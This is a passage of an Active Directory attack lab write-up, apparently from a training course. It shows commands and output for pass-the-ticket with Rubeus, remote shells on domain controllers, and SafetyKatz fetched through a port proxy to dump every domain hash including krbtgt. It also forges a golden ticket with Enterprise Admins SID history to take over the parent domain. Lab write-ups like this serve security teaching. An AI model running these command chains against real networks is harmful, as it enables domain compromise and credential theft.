+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4172
+[+] LUID            : 0xb54cdf
+
+[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: TECH.FINANCE.CORPAdministrator
+[*] Using aes256_cts_hmac_sha1 hash: d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
+[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\administrator'
+[*] Target LUID : 11881695
+[*] Using domain controller: 172.16.4.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[*] Target LUID: 0x143ec18
+[+] Ticket successfully imported!🎟️
+
+  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP
+  ServiceRealm             :  TECH.FINANCE.CORP🏛️
+  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
+  UserRealm                :  TECH.FINANCE.CORP
+  StartTime                :  3/11/2025 5:27:49 PM
+  EndTime                  :  3/12/2025 3:27:49 AM
+  RenewTill                :  3/18/2025 5:27:49 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  4a0nPVWsWRtXkvj8fVNiujrd3S57gbr5Q5urdQeYoD0=
+  ASREP (key)              :  D9410BD213225049D5BEB8CD5FA2EEEFC856FFBAA6F35541AC91D6BA2C5ED165
+```
+
+![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`whoami /groups`:
+```
+ERROR: Unable to get group membership information.
+```
+❌
+
+`klist`:
+```
+Current LogonId is 0:0xb54cdf
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 17:27:49 (local)
+        End Time:   3/12/2025 3:27:49 (local)
+        Renew Time: 3/18/2025 17:27:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+`echo F | xcopy C:\AD\Tools\Loader.exe \\tech-dc\C$\Users\Public\Loader.exe /Y`:
+```
+Does \\tech-dc\C$\Users\Public\Loader.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Loader.exe
+1 File(s) copied
+```
+
+`winrs -r:tech-dc cmd`:
+```
+Microsoft Windows [Version 10.0.17763.2510]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>
+```
+🚀
+
+![tech-dc | administrator](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+tech\administrator👤
+```
+
+`hostname`:
+```
+tech-dc🖥️
+```
+
+`whoami /groups`:
+```
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ===============================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TECH\Group Policy Creator Owners            Group            S-1-5-21-1325336202-3661212667-302732393-520 Mandatory group, Enabled by default, Enabled group
+TECH\Domain Admins👥                        Group            S-1-5-21-1325336202-3661212667-302732393-512 Mandatory group, Enabled by default, Enabled group✅
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+TECH\Denied RODC Password Replication Group Alias            S-1-5-21-1325336202-3661212667-302732393-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level        Label            S-1-16-12288
+```
+
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+
+![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # lsadump::evasive-lsa /patch📌
+
+Domain : TECH🏛️ / S-1-5-21-1325336202-3661212667-302732393📌
+
+RID  : 000001f4 (500)
+User : Administrator👤
+LM   :
+NTLM : acfd00282fbe922483c12e049e6e8990🔑
+
+[SNIP]
+
+RID  : 000001f6 (502)
+User : krbtgt👤
+LM   :
+NTLM : c8c5d0537d1ef5ba43af84fd66dfb498🔑
+
+RID  : 00000454 (1108)
+User : studentuser
+LM   :
+NTLM : 9acca9c6000308085f051a10fe1b5d50
+
+RID  : 00000455 (1109)
+User : techservice
+LM   :
+NTLM : ac25af07540962863d18c6f924ee8ff3
+
+RID  : 00000456 (1110)
+User : databaseagent
+LM   :
+NTLM : 73e728f67a9d8a07983f0b9ce7257fcc
+
+RID  : 00000457 (1111)
+User : sqlserversync
+LM   :
+NTLM : c4fa140adb18d91b7ad9e2bfbc15ab0a
+
+RID  : 000003e8 (1000)
+User : TECH-DC$👤
+LM   :
+NTLM : 0f4f0d4b485a082c384e731e64c700a8🔑
+
+RID  : 00000450 (1104)
+User : STUDVM$
+LM   :
+NTLM : e5c5fa4934a2a058fb61bf3a143d4050
+
+RID  : 00000451 (1105)
+User : MGMTSRV$
+LM   :
+NTLM : 207218a0920d00bbbd4daa22f6e767d3
+
+RID  : 00000452 (1106)
+User : TECHSRV30$
+LM   :
+NTLM : 54c0572a3ddc383be81cdd37b3c8d8a6
+
+RID  : 00000453 (1107)
+User : DBSERVER31$
+LM   :
+NTLM : 8e49721313edefc3bd96634c5920130e
+
+RID  : 0000044f (1103)
+User : FINANCE$
+LM   :
+NTLM : 862f4b5c687b92f464576a572b5214e6
+
+[SNIP]
+```
+
+---
+
+### Cross Trust Attacks
+
+#### Cross Trust Attacks - Child Domain `krbtgt` Key Hash Abuse + DCSync
+
+- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerView.ps1`
+
+`Get-DomainGroup "Enterprise Admins" -Domain finance.corp | Select-Object -ExpandProperty objectsid`:
+```
+S-1-5-21-1712611810-3596029332-2671080496-519📌
+```
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:tech.finance.corp /sid:S-1-5-21-1325336202-3661212667-302732393 /sids:S-1-5-21-1712611810-3596029332-2671080496-519 /aes256:3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3 /netbios:tech /ptt`:
+```
+[SNIP]
+
+[*] Action: Build TGT📌
+
+[*] Building PAC
+
+[*] Domain         : TECH.FINANCE.CORP🏛️ (tech)
+[*] SID            : S-1-5-21-1325336202-3661212667-302732393📌
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-1712611810-3596029332-2671080496-519📌
+[*] ServiceKey     : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt📌
+[*] Target         : tech.finance.corp
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator🎭@tech.finance.corp🏛️'
+
+[*] AuthTime       : 3/11/2025 6:14:50 PM
+[*] StartTime      : 3/11/2025 6:14:50 PM
+[*] EndTime        : 3/12/2025 4:14:50 AM
+[*] RenewTill      : 3/18/2025 6:14:50 PM
+
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[+] Ticket successfully imported!🎟️
+```
+
+`klist`:
+```
+Current LogonId is 0:0x13e557
+
+Cached Tickets: (2)
+
+#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/tech.finance.corp @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 3/11/2025 18:14:50 (local)
+        End Time:   3/12/2025 4:14:50 (local)
+        Renew Time: 3/18/2025 18:14:50 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#1>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
+        Server: http📌/finance-dc🖥️.finance.corp @ FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/11/2025 18:12:27 (local)
+        End Time:   3/12/2025 4:12:10 (local)
+        Renew Time: 3/18/2025 18:12:10 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+`echo F | xcopy C:\AD\Tools\Loader.exe \\finance-dc\C$\Users\Public\Loader.exe /Y`:
+```
+Does \\finance-dc\C$\Users\Public\Loader.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Loader.exe
+1 File(s) copied
+```
+
+`winrs -r:finance-dc.finance.corp cmd`:
+```
+Microsoft Windows [Version 10.0.17763.2510]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.TECH>
+```
+🚀
+
+![finance-dc | administrator](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
+```
+USERNAME=Administrator👑
+```
+
+`set computername`:
+```
+COMPUTERNAME=FINANCE-DC🖥️
+```
+🚩
+
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+
+![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # lsadump::evasive-lsa /patch📌
+
+Domain : FINANCE🏛️ / S-1-5-21-1712611810-3596029332-2671080496📌
+
+RID  : 000001f4 (500)
+User : Administrator👤
+LM   :
+NTLM : 58ce52a1d25fff985d061827fc475535🔑
+
+[SNIP]
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 449b7acf3ddeef577218e66df19510de
+
+RID  : 000003e8 (1000)
+User : FINANCE-DC$
+LM   :
+NTLM : d3d27180dea3670873238d414ef9bcbf
+
+RID  : 0000044f (1103)
+User : TECH$
+LM   :
+NTLM : 862f4b5c687b92f464576a572b5214e6
+
+[SNIP]
+```
+🚩
 
 ---
 
